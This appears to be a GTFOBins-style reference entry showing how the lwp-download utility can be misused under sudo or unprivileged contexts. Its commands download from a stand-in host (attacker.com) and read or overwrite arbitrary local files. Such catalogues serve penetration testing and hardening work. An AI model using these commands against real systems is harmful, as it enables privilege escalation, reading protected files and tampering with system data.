title: lwp-download
html:
lwp-download

Download

Context: sudo, unprivileged

lwp-download http://attacker.com/path/to/input-file /path/to/output-file

File Read

Context: sudo, unprivileged

lwp-download file:///path/to/input-file /dev/stdout

File Write

Context: sudo, unprivileged

echo DATA >/path/to/temp-file
lwp-download file:///path/to/temp-file /path/to/output-file

Context: sudo, unprivileged

lwp-download file:///path/to/input-file /path/to/output-file
excerpt: lwp-download Download Context: sudo, unprivileged lwp-download http://attacker.com/path/to/input-file /path/to/output-file File Read Context: sudo, unprivileged lwp-download file:///path/to/input-file
